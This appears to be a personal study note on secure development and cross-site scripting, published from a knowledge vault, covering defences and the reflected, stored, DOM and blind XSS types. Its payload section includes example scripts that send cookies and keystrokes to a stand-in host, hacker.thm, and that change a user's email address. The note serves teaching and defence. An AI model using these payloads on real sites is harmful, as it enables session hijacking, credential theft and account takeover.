Challenges\u003c/h2\u003e\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\u003ctable\u003e\u003cthead\u003e\u003ctr\u003e\u003cth\u003e\u003c/th\u003e\u003cth\u003eDevelopers\u003c/th\u003e\u003cth\u003eHackers\u003c/th\u003e\u003c/tr\u003e\u003c/thead\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd\u003eTime\u003c/td\u003e\u003ctd\u003eUnder time pressure to develop and test functionality\u003c/td\u003e\u003ctd\u003eMay have unlimited time\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003eFocus\u003c/td\u003e\u003ctd\u003eSecurity is not the primary focus over functionality\u003c/td\u003e\u003ctd\u003eFocused on finding security holes\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003eMotivation / Resources\u003c/td\u003e\u003ctd\u003eResponsible to product's primary functionality\u003c/td\u003e\u003ctd\u003eBragging rights, illicit profits\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003eSpecialization\u003c/td\u003e\u003ctd\u003eSpecialize on functionality of the product\u003c/td\u003e\u003ctd\u003eSpecialize in security penetration\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\n\u003ch3 id=\"mitigate-product-security-risk\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#mitigate-product-security-risk\"\u003e\u003c/a\u003eMitigate Product Security Risk\u003c/h3\u003e\n\u003ch4 id=\"prevent-new-bugs\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#prevent-new-bugs\"\u003e\u003c/a\u003ePrevent New Bugs\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003eKnow SANS 25 Most Dangerous Programming Errors (includes most of common security Top 10).\u003c/li\u003e\n\u003cli\u003e\"Think like a hacker\". How can code be abused?\u003c/li\u003e\n\u003cli\u003eBuild software defenses into software:\n\u003cul\u003e\n\u003cli\u003eInput Validation\u003c/li\u003e\n\u003cli\u003eOutput Sanitization\u003c/li\u003e\n\u003cli\u003eStrong Encryption\u003c/li\u003e\n\u003cli\u003eStrong Authentication and Authorization\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eChoose secure frameworks rather than simply reply on developer security skills.\u003c/li\u003e\n\u003cli\u003eDo not think product is isolated from the Internet is not at risk.\u003c/li\u003e\n\u003cli\u003eDo not think that if a file or a database is local does not need to be protected. The majority of breaches are launched internally.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"address-existing-bugs\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#address-existing-bugs\"\u003e\u003c/a\u003eAddress Existing Bugs\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003eRedesign product front end to be good looking and functional, but also secure.\u003c/li\u003e\n\u003cli\u003eImplement smart architectural changes that fix security flaws at the top.\u003c/li\u003e\n\u003cli\u003eDo not spot-fix issues.\n\u003cul\u003e\n\u003cli\u003eImplement a fix across the board and how to be prevented in the future.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eSecurity bugs are special because of their potential impact.\u003c/li\u003e\n\u003cli\u003eDeliver security patches with faster release vehicles.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"common-attacks---cross-site-scripting\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#common-attacks---cross-site-scripting\"\u003e\u003c/a\u003eCommon Attacks - Cross-Site Scripting\u003c/h2\u003e\n\u003cp\u003eCross-Site Scripting (XSS)\n: Allows attackers to inject client-side scripts into the web page.\u003c/p\u003e\n\u003ch3 id=\"dangers-of-xss\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#dangers-of-xss\"\u003e\u003c/a\u003eDangers of XSS\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eHarvest credentials\u003c/li\u003e\n\u003cli\u003eTake over user sessions\u003c/li\u003e\n\u003cli\u003eCSRF\u003c/li\u003e\n\u003cli\u003eSteal cookies, local store data\u003c/li\u003e\n\u003cli\u003eElevate privileges\u003c/li\u003e\n\u003cli\u003eRedirect users to malicious sites\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eXSS is widespread in 3rd party products such as WordPress and Drupal.\u003c/p\u003e\n\u003ch3 id=\"in-the-news\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#in-the-news\"\u003e\u003c/a\u003eIn the News\u003c/h3\u003e\n\u003cp\u003eCross-site scripting vulnerabilities are extremely common. Below are a few reports of XSS found in massive applications:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eeBay XSS bug left users vulnerable to (almost) undetectable phishing attacks.\u003c/li\u003e\n\u003cli\u003eThe Apache Foundation hacked by exploiting XSS in JIRA.\u003c/li\u003e\n\u003cli\u003eXSS found in Shopify.\u003c/li\u003e\n\u003cli\u003e$7,500 for XSS found in Steam chat.\u003c/li\u003e\n\u003cli\u003e$2,500 for XSS in HackerOne.\u003c/li\u003e\n\u003cli\u003eXSS found in Infogram.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"effective-defenses\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#effective-defenses\"\u003e\u003c/a\u003eEffective Defenses\u003c/h3\u003e\n\u003ch4 id=\"html-encoding\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#html-encoding\"\u003e\u003c/a\u003eHTML Encoding\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003eOutput Encoding works well for server side generate pages and is quite effective in neutralizing most XSS payloads.\n\u003cul\u003e\n\u003cli\u003eHTML Encoding alone will not prevent charset attacks.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"javascript-escaping\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#javascript-escaping\"\u003e\u003c/a\u003eJavaScript Escaping\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003eXSS can be introduced with JavaScript code.\u003c/li\u003e\n\u003cli\u003eEscaping single quotes will prevent injection.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"safe-dom-elements\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#safe-dom-elements\"\u003e\u003c/a\u003eSafe DOM Elements\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003eXSS in modern Rich Client UIs is often made possible by unsafe handling of the DOM.\u003c/li\u003e\n\u003cli\u003eUsing the \u003ccode\u003einnerHtml\u003c/code\u003e attribute allows the user input to be rendered as HTML and XSS with JavaScript events as possible.\u003c/li\u003e\n\u003cli\u003eThe safe alternative is to use \u003ccode\u003etextContent\u003c/code\u003e (or \u003ccode\u003einnerText\u003c/code\u003e in some versions of IE).\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"use-eval-and-dynamic-code-generation-with-care\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#use-eval-and-dynamic-code-generation-with-care\"\u003e\u003c/a\u003eUse Eval and Dynamic Code Generation with Care\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003eJavaScript \u003ccode\u003eeval()\u003c/code\u003e function which accepts a JavaScript expression as a string argument and executes it. Use of this function is discouraged.\u003c/li\u003e\n\u003cli\u003eSame care is needed when the code generates pieces of JavaScript dynamically. Also discouraged.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"input-validation\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#input-validation\"\u003e\u003c/a\u003eInput Validation\u003c/h4\u003e\n\u003cp\u003e\u003cstrong\u003eWhitelisting\u003c/strong\u003e is recommended.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eReduces the attack surface to a known quantity.\u003c/li\u003e\n\u003cli\u003eIf possible, most input should be whitelisted to alphanumeric to prevent XSS (and many other attacks).\u003c/li\u003e\n\u003cli\u003eSpecial characters should only be allowed on an exception basis.\u003c/li\u003e\n\u003cli\u003eSome cases may be relaxed to allow single quotes or other characters.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eBlacklisting\u003c/strong\u003e - NOT RECOMMENDED.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eCreative attacker may bypass blacklist by trying a previously unknown method.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eClient Side Input Validation\u003c/strong\u003e - NOT RECOMMENDED.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eCan only be used to assist with product usability.\u003c/li\u003e\n\u003cli\u003eAttackers can easily bypass it by sending the request directly to the server.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"use-proven-validation-and-encoding-functionality\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#use-proven-validation-and-encoding-functionality\"\u003e\u003c/a\u003eUse Proven Validation and Encoding Functionality\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003eProtect both input and output - \"Defense in Depth\" principle.\u003c/li\u003e\n\u003cli\u003eAs you validate the input and encode the output, use proven and reputable libraries.\u003c/li\u003e\n\u003cli\u003eIt is best to implement a framework that has one central set of functionality that validates and encodes data.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"xss-payloads\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#xss-payloads\"\u003e\u003c/a\u003eXSS Payloads\u003c/h2\u003e\n\u003cp\u003eIn XSS, the payload is the JavaScript code we wish to be executed on the target's computer. There are two parts to the payload: the intention and the modification.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIntention is what you wish the JavaScript to actually do.\u003c/li\u003e\n\u003cli\u003eModification is the changes to the code we need to make it execute as every scenario is different.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eExamples of XSS Intentions:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eProof of Concept\u003c/strong\u003e: Simplest payload to demonstrate XSS is possible on a website - causing an alert box to pop up on the page with a string of text.\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e\u0026#x3C;script\u003ealert('XSS');\u0026#x3C;/script\u003e\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eSession Stealing\u003c/strong\u003e: Details of a user's session, such as login tokens, are often kept in cookies on the target's machine.\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e\u0026#x3C;script\u003efetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));\u0026#x3C;/script\u003e\u003c/code\u003e\n\u003cul\u003e\n\u003cli\u003eTakes target's cookie, base64 encodes the cookie to ensure successful transmission for control to be logged in.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eKey Logger\u003c/strong\u003e: Acts as a key logger where anything typed on the webpage will be forwarded to a website under the hacker's control.\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e\u0026#x3C;script\u003edocument.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}\u0026#x3C;/script\u003e\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eBusiness Logic\u003c/strong\u003e: Calls a particular network resource or a JavaScript function. In this example for changing the email's address called \u003ccode\u003euser.changeEmail()\u003c/code\u003e.\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e\u0026#x3C;script\u003euser.changeEmail('attacker@hacker.thm');\u0026#x3C;/script\u003e\u003c/code\u003e\n\u003cul\u003e\n\u003cli\u003eAllows a password reset for the attacker.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"reflected-xss\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#reflected-xss\"\u003e\u003c/a\u003eReflected XSS\u003c/h3\u003e\n\u003cp\u003eReflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/a5b0dbc4d2f1f69988f82f2c5d53f6ed.png\" alt=\"reflected-error\"\u003e\n\u003cimg src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/7f90b73106d655b07874943f93533f7b.png\" alt=\"reflected\"\u003e\u003c/p\u003e\n\u003cp\u003eA website where entering the incorrect input, an error message is displayed to the parameter in the query string directly into the page source.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe application does not check the contents of the error parameter, which allows the attacker to insert the malicious code.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cimg src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/8e3bffe500771c03366de569c3565058.png\" alt=\"xss\"\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute on their browser, potentially revealing session or customer information.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"how-to-test-for-reflected-xss\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#how-to-test-for-reflected-xss\"\u003e\u003c/a\u003eHow to Test for Reflected XSS\u003c/h4\u003e\n\u003cp\u003eCheck every possible point of entry:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eParameters in the URL query string\u003c/li\u003e\n\u003cli\u003eURL file path\u003c/li\u003e\n\u003cli\u003eSometimes HTTP headers (unlikely exploitable)\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"stored-xss\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#stored-xss\"\u003e\u003c/a\u003eStored XSS\u003c/h3\u003e\n\u003cp\u003eThe XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/cc2566d297f7328d91bc8552f902210e.png\" alt=\"stored-XSS\"\u003e\u003c/p\u003e\n\u003cp\u003eA blog website that allows users to post comments, but these comments are not checked or filtered for any malicious JavaScript code.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe malicious JavaScript could redirect users to another site, steal the user's session cookie, or perform other website actions while acting as the visiting user.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"how-to-test-for-stored-xss\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#how-to-test-for-stored-xss\"\u003e\u003c/a\u003eHow to Test for Stored XSS\u003c/h4\u003e\n\u003cp\u003eTest every possible entry point where it seems data is stored and then shown back in areas that other users have access to:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eComments on a blog\u003c/li\u003e\n\u003cli\u003eUser profile information\u003c/li\u003e\n\u003cli\u003eWebsite listings\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"dom-based-xss\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#dom-based-xss\"\u003e\u003c/a\u003eDOM-Based XSS\u003c/h3\u003e\n\u003cp\u003eDOM stands for Document Object Model and is a programming interface for HTML and XML documents. A web page is a document, and this document can be either displayed in the browser window or as the HTML source.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/24a54ac532b5820bf0ffdddf00ab2247.png\" alt=\"DOM\"\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eDOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.\u003c/li\u003e\n\u003cli\u003eCrafted links could be sent to potential victims, redirecting them to another website or steal content from the page or the user's session.\n\u003cul\u003e\n\u003cli\u003eAn example: JavaScript gets the contents from the \u003ccode\u003ewindow.location.hash\u003c/code\u003e parameter and then writes that onto the page in the currently being viewed section. The contents of the hash are not checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto their webpage.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"how-to-test-for-dom-based-xss\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#how-to-test-for-dom-based-xss\"\u003e\u003c/a\u003eHow to Test for DOM Based XSS\u003c/h4\u003e\n\u003cp\u003eChallenging to test for and requires a certain amount of JavaScript knowledge to read the source code.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eLook for parts of code that access certain variables that an attacker can have control over, such as 'window.location.x' parameters.\n\u003cul\u003e\n\u003cli\u003eSee how they are handled and whether the values are written to the web page's DOM or passed to unsafe JavaScript methods such as \u003ccode\u003eeval()\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"blind-xss\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#blind-xss\"\u003e\u003c/a\u003eBlind XSS\u003c/h3\u003e\n\u003cp\u003eBlind XSS is similar to a stored XSS in that the payload gets stored on the website for another user to view, but in this instance, can't see the payload working or be able to test it against yourself first.\u003c/p\u003e\n\u003cp\u003eA website has a contact form where you can message a member of staff. The message content does not get checked for any malicious code, which allows the attacker to enter anything they wish.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eUsing the correct payload, the attacker's JavaScript could make calls back to an attacker's website, revealing the staff portal URL, the staff member's cookies, and even the contents of the portal page viewed.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"how-to-test-for-blind-xss\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#how-to-test-for-blind-xss\"\u003e\u003c/a\u003eHow to Test for Blind XSS\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003eWhen testing for Blind XSS vulnerabilities, need to ensure payload has a call back (usually an HTTP request) to know is being executed.\u003c/li\u003e\n\u003cli\u003eA popular tool for Blind XSS attacks is \u003ca href=\"https://xsshunter.com/\"\u003exsshunter\u003c/a\u003e.\u003c/li\u003e\n\u003c/ul\u003e","noteIndex":{"id":"3ipqfkgudo2s73dwa256ca0","title":"Brain","desc":"","updated":1654212603514,"created":1651706375099,"custom":{"nav_order":0,"permalink":"/"},"fname":"root","type":"note","vault":{"fsPath":"vault"},"contentHash":"a83b284bd096f5e390fe503b2b0b07c7","links":[{"type":"ref","from":{"fname":"root","id":"3ipqfkgudo2s73dwa256ca0","vaultName":"vault"},"value":"cybersecurity","position":{"start":{"line":5,"column":1,"offset":76},"end":{"line":5,"column":19,"offset":94},"indent":[]},"xvault":false,"to":{"fname":"cybersecurity"}}],"anchors":{"welcome-to-tysons-vault":{"type":"header","text":"Welcome to Tyson's Vault!","value":"welcome-to-tysons-vault","line":7,"column":0,"depth":1},"lookup":{"type":"header","text":"Lookup","value":"lookup","line":14,"column":0,"depth":2}},"children":["nkcab8fkftjfz927no2dyac","cl0utj7thwjp7bsmxe4v5va","o9kgllk4dy29wx2figqoz1w","5vhy4yxl34a7p6064a13u49","ce290z98noyy6eb5pniawk9","txeqnq5eaictderxvuifqr6","pn4fankyf3uifous1txqj5m","8ykaxd1qjsjfi1c6zsfq1eq","017vb349bxpq76wq69sai1u","wcuptt9dpzdx06nt9l6myuv","iulpmov883qv6tpqkgvbno8","8ml5picmbrjw3u887mag9dz","pd3512leoloo1qll6fr2j0o","e77elhqi5fhnpz5kdvxeudb","9k9gs0zqcs40mq2fsi5nesj","zegnyfq64amprq2yq9rnu3e","op8gluer5gorswd1xkdwwis","btat806wf3v71jpa11klryx","kldz5ejn1lvhsujdm2nyog7","9gc4nxd14um87nyud8e9ubt","ptonz0zapnutyahjkedfn8f","ixopv5geql8hlgkwk20pxow","3cschspue6elfiqxcd17tul","0f8xutu1gmbnw7xt51tim9v","87sb4tbzuopxpz736rwtx5b","d9ibeadgk68z3q2qjgsqida","woqkmy53oegpxi1ia3jl833","6ltznv32t1szgyl74knpxly","16md0j2hj1k5477uu3kclcb","2o3i5a96njb0vlfr61lslzi"],"parent":null,"data":{},"body":"# Welcome to Tyson's Vault!\n\nThis is my place store all my cool knowledge.\n\n![[cybersecurity]]\n\n\n## Lookup\n\nThis section contains useful links to related resources.\n\n- [Getting Started Guide](https://link.dendron.so/6b25)\n- [Discord](https://link.dendron.so/6b23)\n- [Home Page](https://wiki.dendron.so/)\n- [Github](https://link.dendron.so/6b24)\n- [Developer Docs](https://docs.dendron.so/)\n"},"collectionChildren":null,"customHeadContent":null,"config":{"version":5,"dev":{"enablePreviewV2":true},"commands":{"lookup":{"note":{"selectionMode":"extract","confirmVaultOnCreate":true,"vaultSelectionModeOnCreate":"smart","leaveTrace":false,"bubbleUpCreateNew":true,"fuzzThreshold":0.2}},"randomNote":{},"insertNote":{"initialValue":"templates"},"insertNoteLink":{"aliasMode":"none","enableMultiSelect":false},"insertNoteIndex":{"enableMarker":false},"copyNoteLink":{},"templateHierarchy":"template"},"workspace":{"vaults":[{"fsPath":"vault"}],"journal":{"dailyDomain":"daily","name":"journal","dateFormat":"y.MM.dd","addBehavior":"childOfDomain"},"scratch":{"name":"scratch","dateFormat":"y.MM.dd.HHmmss","addBehavior":"asOwnDomain"},"task":{"name":"","dateFormat":"","addBehavior":"childOfCurrent","statusSymbols":{"":" ","wip":"w","done":"x","assigned":"a","moved":"m","blocked":"b","delegated":"l","dropped":"d","pending":"y"},"prioritySymbols":{"H":"high","M":"medium","L":"low"},"todoIntegration":false,"createTaskSelectionType":"selection2link","taskCompleteStatus":["done","x"]},"graph":{"zoomSpeed":1,"createStub":false},"enableAutoCreateOnDefinition":false,"enableXVaultWikiLink":false,"enableRemoteVaultInit":true,"enableUserTags":true,"enableHashTags":true,"workspaceVaultSyncMode":"noCommit","enableAutoFoldFrontmatter":false,"enableEditorDecorations":true,"maxPreviewsCached":10,"maxNoteLength":204800,"enableFullHierarchyNoteTitle":false,"enableHandlebarTemplates":false,"templateHierarchy":"template","enableSmartRefs":true,"dendronVersion":"0.83.0"},"preview":{"theme":"dark","enableFMTitle":true,"enableNoteTitleForLink":true,"enableFrontmatterTags":true,"enableHashesForFMTags":false,"enableMermaid":true,"enablePrettyRefs":true,"enableKatex":true,"automaticallyShowPreview":false},"publishing":{"logoPath":"https://clipground.com/images/cyber-logo-3.jpg","theme":"dark","siteUrl":"https://tysonnguyen.github.io","assetsPrefix":"/IBM-cybersecurity","enableFMTitle":true,"enableNoteTitleForLink":true,"enableMermaid":true,"enablePrettyRefs":true,"enableKatex":true,"copyAssets":true,"siteHierarchies":["root"],"writeStubs":false,"siteRootDir":"docs","seo":{"title":"Cybersecurity","description":"Personal Knowledge Space"},"github":{"enableEditLink":true,"editLinkText":"Edit this page on GitHub","editBranch":"main","editViewMode":"tree","editRepository":"https://github.com/TysonNguyen/IBM-cybersecurity"},"enableSiteLastModified":true,"enableFrontmatterTags":true,"enableHashesForFMTags":false,"enableRandomlyColoredTags":true,"enablePrettyLinks":true,"duplicateNoteBehavior":{"action":"useVault","payload":["vault"]},"enableTaskNotes":true,"siteFaviconPath":"favicon.ico","siteIndex":"root"}}},"__N_SSG":true},"page":"/notes/[id]","query":{"id":"9580eaxs80sdsmko50z0kh2"},"buildId":"NXb5WjKoAzTxCthMfgKQk","assetPrefix":"/IBM-cybersecurity","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>